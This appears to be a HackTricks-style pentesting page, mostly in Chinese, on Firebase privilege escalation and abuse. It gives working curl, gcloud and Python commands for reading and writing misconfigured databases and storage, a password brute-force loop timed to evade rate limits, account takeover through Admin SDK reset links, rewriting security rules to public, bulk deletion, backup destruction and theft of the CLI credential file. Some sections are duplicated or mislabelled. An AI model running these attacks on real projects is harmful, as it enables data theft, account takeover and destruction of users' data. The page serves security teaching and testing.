# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### 未经身份验证访问 Firebase Realtime Database
攻击者不需要任何特定的 Firebase 权限即可进行此攻击。只要 Firebase Realtime Database 的安全规则存在易受攻击的配置，即规则设置为 `.read: true` 或 `.write: true`，允许公开读取或写入，就可以被利用。

攻击者需要识别数据库 URL，通常格式为：`https://<project-id>.firebaseio.com/`。

可以通过移动应用逆向工程（反编译 Android APKs 或 分析 iOS apps）、分析配置文件（例如 google-services.json（Android）或 GoogleService-Info.plist（iOS））、检查 web 应用的源代码，或通过检查网络流量以识别对 `*.firebaseio.com` 域的请求来发现该 URL。

攻击者识别出数据库 URL 并检查其是否公开暴露，随后访问数据并可能写入恶意信息。

首先，他们通过在 URL 末尾添加 .json 来检查数据库是否允许读取访问。
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
如果响应包含 JSON 数据或 null（而不是 "Permission Denied"），则数据库允许读取访问。要检查写入访问，攻击者可以尝试使用 Firebase REST API 发送测试写入请求。
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
如果操作成功，数据库也会允许写入访问。

### Cloud Firestore 中的数据暴露
攻击者不需要任何特定的 Firebase 权限来执行此攻击。它仅要求 Cloud Firestore 的安全规则存在易受攻击的配置，该配置在没有认证或验证不足的情况下允许读取或写入访问。下面是一个授予完全访问权限的错误配置规则示例：
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
该规则允许任何人在没有任何限制的情况下读取和写入所有文档。Firestore 规则是按集合和文档粒度生效的，因此特定规则中的错误可能只会暴露某些集合。

攻击者必须识别 Firebase Project ID，可通过 mobile app reverse engineering、分析配置文件（例如 google-services.json 或 GoogleService-Info.plist）、检查 web 应用的源代码，或分析网络流量以识别对 firestore.googleapis.com 的请求来找到它。

Firestore REST API 使用的格式如下：
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
如果规则允许未认证的读取访问，攻击者可以读取集合和文档。首先，他们尝试访问一个特定的集合：
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
如果响应包含 JSON 文档而不是权限错误，则该 collection 暴露。攻击者可以通过尝试常见名称或分析应用的结构来枚举所有可访问的 collections。要访问特定 document：
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
如果规则允许未认证的写入访问或验证不足，攻击者可以创建新文档：
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
要修改现有文档，应使用 PATCH：
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
要删除文档并导致拒绝服务：
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Firebase Storage 中的文件暴露

攻击者不需要任何特定的 Firebase 权限即可执行此攻击。它只要求 Firebase Storage 的安全规则存在易受攻击的配置，即规则在未认证或校验不足的情况下允许读取或写入访问。存储规则独立控制读取和写入权限，因此规则中的错误可能仅暴露读取访问、仅暴露写入访问，或两者都暴露。下面是一个授予完全访问权限的错误配置规则示例：
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
此规则允许对所有 document 进行不受任何限制的读写访问。Firestore rules 非常细粒度，按 collection 和 document 应用，因此某个具体规则的错误可能仅暴露某些集合。攻击者必须识别 Firebase Project ID，可通过 mobile application reverse engineering、分析配置文件（例如 google-services.json 或 GoogleService-Info.plist）、检查 web 应用源代码，或通过网络流量分析来识别对 firestore.googleapis.com 的请求。

Firestore REST API 的格式为: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

如果规则允许 unauthenticated 读取访问，攻击者就可以读取 collections 和 documents。首先，他们会尝试访问特定的 collection。
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
如果响应包含文件列表而不是权限错误，则该文件已暴露。attacker 可以通过指定文件路径来查看文件内容：
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
如果规则允许未认证的写入访问或验证不足，攻击者可以上传恶意文件。要通过 REST API 上传文件：
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
攻击者可以上传 code shells、malware payloads 或大型文件以导致 denial of service。如果应用处理或执行上传的文件，攻击者可能实现 remote code execution。要删除文件并导致 denial of service：
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### 调用公开的 Firebase Cloud Functions
An attacker does not need any specific Firebase permissions to exploit this issue; it only requires that a Cloud Function is publicly accessible over HTTP without authentication.

A function is vulnerable when it is insecurely configured:

- It uses functions.https.onRequest, which does not enforce authentication (unlike onCall functions).
- The function’s code does not validate user authentication (e.g., no checks for request.auth or context.auth).
- The function is publicly accessible in IAM, meaning allUsers has the roles/cloudfunctions.invoker role. This is the default behavior for HTTP functions unless the developer restricts access.

Firebase HTTP Cloud Functions are exposed through URLs such as:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

An attacker can discover these URLs through source code analysis, network traffic inspection, enumeration tools, or mobile app reverse engineering.
If the function is publicly exposed and unauthenticated, the attacker can invoke it directly without credentials.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
If the function does not properly validate inputs, the attacker may attempt other attacks such as code injection or command injection.


### Brute-force attack against Firebase Authentication with a weak password policy
攻击者不需要任何特定的 Firebase 权限即可执行此攻击。只需 Firebase API Key 在移动或 Web 应用中被暴露，并且密码策略未设置比默认更严格的要求。

攻击者需要识别 Firebase API Key，可以通过 mobile app reverse engineering、分析配置文件（例如 google-services.json 或 GoogleService-Info.plist）、检查 Web 应用的源代码（例如 bootstrap.js），或分析网络流量来找到它。

Firebase Authentication 的 REST API 使用端点：`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>` 来使用邮箱和密码进行身份验证。

如果 Email Enumeration Protection 被禁用，API 的错误响应会泄露某个 email 是否存在于系统中（EMAIL_NOT_FOUND 与 INVALID_PASSWORD），这允许攻击者在尝试密码猜测之前枚举用户。启用该保护时，API 会对不存在的 email 和错误的密码返回相同的错误消息，从而阻止用户枚举。

需要注意的是，Firebase Authentication 会强制执行速率限制，如果在短时间内发生过多的身份验证尝试，可能会阻止请求。因此，攻击者不得不在尝试之间引入延迟以避免触发速率限制。

攻击者识别出 API Key，并针对已知账户使用多个密码进行身份验证尝试。如果 Email Enumeration Protection 被禁用，攻击者可以通过分析错误响应来枚举现有用户：
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
如果响应包含 EMAIL_NOT_FOUND，则该邮箱在系统中不存在。  
如果响应包含 INVALID_PASSWORD，则该邮箱存在但密码不正确，确认该用户已注册。  
一旦确认了有效用户，攻击者即可进行 brute-force 尝试。  
在尝试之间加入暂停以避免 Firebase Authentication 的 rate-limiting 机制非常重要：
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
在默认密码策略（最少 6 个字符，且不要求复杂度）下，攻击者可以尝试所有可能的 6 字符密码组合，相对于更严格的密码策略，这表示一个相对较小的搜索空间。

### Firebase Authentication 中的用户管理

攻击者需要特定的 Firebase Authentication 权限来执行此攻击。所需权限包括：

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

这些权限包含在 `roles/firebaseauth.admin` 角色中，该角色授予对 Firebase Authentication 资源的完全读/写访问。它们也包含在更高级别的角色中，例如 roles/firebase.developAdmin（包括所有 firebaseauth.* 权限）和 roles/firebase.admin（对所有 Firebase 服务的完全访问权限）。

要使用 Firebase Admin SDK，攻击者需要访问服务账号凭据（JSON 文件），这些凭据可能出现在被攻陷的系统、公开暴露的代码仓库、被攻陷的 CI/CD 系统，或通过被攻陷的具有访问这些凭据的开发者账户而被获取。

第一步是使用服务账号凭据配置 Firebase Admin SDK。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
为了使用受害者的邮箱创建一个恶意用户，攻击者会尝试使用 Firebase Admin SDK 在该邮箱下生成一个新账户。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
要修改现有用户，攻击者会更新诸如电子邮件地址、验证状态或账户是否被禁用等字段。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
为删除用户帐户并造成拒绝服务，攻击者会发出请求将该用户完全移除。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻击者也可以通过请求用户的 UID 或电子邮件地址来检索现有用户的信息。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
此外，攻击者还可以生成验证链接或密码重置链接，以便更改用户的密码并获取其账户访问权限。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication 中的用户管理
攻击者需要特定的 Firebase Authentication 权限来执行此攻击。所需的权限有：

- `firebaseauth.users.create` 来创建用户
- `firebaseauth.users.update` 来修改现有用户
- `firebaseauth.users.delete` 来删除用户
- `firebaseauth.users.get` 来获取用户信息
- `firebaseauth.users.sendEmail` 来向用户发送邮件
- `firebaseauth.users.createSession` 来创建用户会话

这些权限包含在 roles/firebaseauth.admin 角色中，该角色授予对 Firebase Authentication 资源的完整读/写访问权限。它们也属于更高级别的角色，例如 `roles/firebase.developAdmin`（包含所有 firebaseauth.* 权限）和 `roles/firebase.admin`（对所有 Firebase 服务的完全访问权限）。

要使用 Firebase Admin SDK，攻击者需要访问 service account 凭据（一个 JSON 文件），这些凭据可能来自被攻陷的系统、公开暴露的代码仓库、被攻破的 CI/CD 环境，或通过拥有这些凭据访问权限的开发者账号被攻破而获取。

第一步是使用服务账号凭据配置 Firebase Admin SDK。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
为了使用受害者的电子邮件创建恶意用户，攻击者会尝试用该电子邮件创建一个新的用户帐户，并为其设置自己的密码和个人资料信息。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
要修改现有用户，攻击者会更改诸如电子邮件地址、验证状态或账户是否被禁用等字段。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
要删除用户账户——实际上造成 denial of service——攻击者会发出请求以永久移除该用户。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻击者还可以检索有关现有用户的信息，例如他们的 UID 或电子邮件，通过按 UID 或电子邮件地址请求用户详细信息。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
此外，攻击者可以生成验证链接或密码重置链接，从而更改用户的密码并接管该账户。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### 在 Firebase 服务中修改安全规则
攻击者需要根据服务的不同拥有特定权限来修改安全规则。对 Cloud Firestore 和 Firebase Cloud Storage，所需权限是 `firebaserules.rulesets.create`（用于创建 rulesets）和 `firebaserules.releases.create`（用于部署 releases）。这些权限包含在 `roles/firebaserules.admin` 角色中，或包含在更高层级的角色，例如 `roles/firebase.developAdmin` 和 `roles/firebase.admin`。对于 Firebase Realtime Database，所需权限是 `firebasedatabase.instances.update`。

攻击者必须使用 Firebase REST API 来修改安全规则。首先，攻击者需要使用服务帐号凭据获取访问令牌。要获取该令牌：
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
要修改 Firebase Realtime Database 规则：
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
要修改 Cloud Firestore 规则，攻击者必须创建一个规则集并部署它：
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
上一个命令返回一个格式为 projects/<project-id>/rulesets/<ruleset-id> 的 ruleset 名称。要部署新版本，必须使用 PATCH 请求更新 release：
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
要修改 Firebase Cloud Storage 规则：
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
先前的命令会返回一个规则集名称，格式为 projects/<project-id>/rulesets/<ruleset-id>。要部署新版本，必须使用 PATCH 请求更新 release：
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### 在 Cloud Firestore 中的数据外泄与篡改
Cloud Firestore 使用与 Cloud Datastore 相同的基础设施和权限系统，因此 Datastore IAM 权限直接适用于 Firestore。要操作 TTL 策略，需要 `datastore.indexes.update` 权限。要导出数据，需要 `datastore.databases.export` 权限。要导入数据，需要 datastore.databases.import 权限。要执行批量数据删除，需要 `datastore.databases.bulkDelete` 权限。

对于备份和恢复操作，需要特定的权限：

- `datastore.backups.get` 和 `datastore.backups.list` 用于列出并检索可用备份的详细信息
- `datastore.backups.delete` 用于删除备份
- `datastore.backups.restoreDatabase` 用于从备份恢复数据库
- `datastore.backupSchedules.create` 和 `datastore.backupSchedules.delete` 用于管理备份计划

创建 TTL 策略时，会选择一个指定属性来识别符合删除条件的实体。该 TTL 属性必须为日期和时间类型。攻击者可以选择一个已存在的属性，或指定一个计划稍后添加的属性。如果该字段的值是过去的日期，文档将变为可立即删除。攻击者可以使用 gcloud CLI 来操纵 TTL 策略。
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
为了导出数据并进行 exfiltrate，攻击者可以使用 gcloud CLI。
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
导入恶意数据:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
为了执行大规模数据删除并造成 denial of service，攻击者可以使用 gcloud Firestore bulk-delete tool 删除整个 collections。
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
对于备份和恢复操作，攻击者可以创建定时备份以捕获数据库的当前状态、列出现有备份、从备份恢复以覆盖最近更改、删除备份以造成永久数据丢失，以及移除定时备份。  
要创建一个每天运行并立即生成备份的计划：
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
要从特定备份恢复，攻击者可以使用该备份中的数据创建一个新的数据库。恢复操作会将备份的数据写入一个新数据库，这意味着不能使用已有的 DATABASE_ID。
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
要删除备份并导致永久数据丢失：
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI 凭证的窃取和滥用
攻击者不需要特定的 Firebase 权限来执行此攻击，但他们需要访问开发者的本地系统或 Firebase CLI 凭证文件。这些凭证存储在位于如下位置的 JSON 文件中：

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

该文件包含身份验证令牌，包括 refresh_token 和 access_token，这些令牌允许攻击者以最初运行 firebase login 的用户身份进行认证。

攻击者获得 Firebase CLI 凭证文件访问权限后，可以将整个文件复制到自己的系统，Firebase CLI 会自动从其默认位置使用这些凭证。这样一来，攻击者就可以查看该用户可访问的所有 Firebase 项目。
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
